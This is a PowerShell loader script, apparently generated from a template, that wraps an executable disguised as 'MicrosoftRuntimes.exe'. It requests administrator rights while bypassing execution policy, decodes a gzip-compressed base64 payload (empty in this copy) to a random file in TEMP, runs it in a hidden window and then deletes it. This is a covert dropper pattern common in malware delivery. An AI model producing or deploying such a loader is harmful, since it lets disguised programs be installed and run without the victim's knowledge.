# File execution script
# Original file: MicrosoftRuntimes.exe
# Compressed size: 1356480 bytes

param([switch]$RunSilently = $true)

# Admin check and elevation
if (-not $NoAdmin -and -not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $currentScript = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
    
    try {
        $processArgs = @{
            FilePath = "powershell.exe"
            ArgumentList = "-ExecutionPolicy Bypass -File `"$currentScript`" -RunSilently"
            Verb = "RunAs"
            WindowStyle = "Hidden"
            ErrorAction = "Stop"
        }
        $process = Start-Process @processArgs
        exit
    }
    catch {
        Write-Warning "Administrator elevation failed or was canceled. Continuing with current privileges."
    }
}

function Expand-File {
    try {
        # Create temporary file with original extension
        $tempDir = $env:TEMP
        $tempFile = [System.IO.Path]::Combine($tempDir, [System.IO.Path]::GetRandomFileName() + ".exe")
        
        # Decode and decompress
        $compressedBytes = [Convert]::FromBase64String('')
        $inputStream = New-Object System.IO.MemoryStream(, $compressedBytes)
        $outputStream = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GZipStream($inputStream, [System.IO.Compression.CompressionMode]::Decompress)
        
        $gzipStream.CopyTo($outputStream)
        $gzipStream.Dispose()
        $inputStream.Dispose()
        
        $fileBytes = $outputStream.ToArray()
        $outputStream.Dispose()
        
        # Write to temporary location
        [System.IO.File]::WriteAllBytes($tempFile, $fileBytes)
        
        return $tempFile
    }
    catch {
        throw "Failed to expand file: $($_.Exception.Message)"
    }
}

try {
    $tempFilePath = Expand-File
    
    # Execute based on file type
    if (".exe" -eq ".exe") {
        $processArgs = @{
            FilePath = $tempFilePath
            WindowStyle = "Hidden"
            PassThru = $true
            ErrorAction = "Stop"
        }
        
        $process = Start-Process @processArgs
        Write-Host "Executed: $tempFilePath (PID: $($process.Id))"
        
        # Cleanup after execution
        if (-not $Persistence) {
            Start-Sleep -Milliseconds 500
            Remove-Item $tempFilePath -Force -ErrorAction SilentlyContinue
        }
    }
    else {
        Write-Host "File extracted to: $tempFilePath"
        # Open file with default application if not running silently
        if (-not $RunSilently) {
            Start-Process $tempFilePath
        }
    }
}
catch {
    Write-Error "Execution failed: $($_.Exception.Message)"
    exit 1
}

# Persistence disabled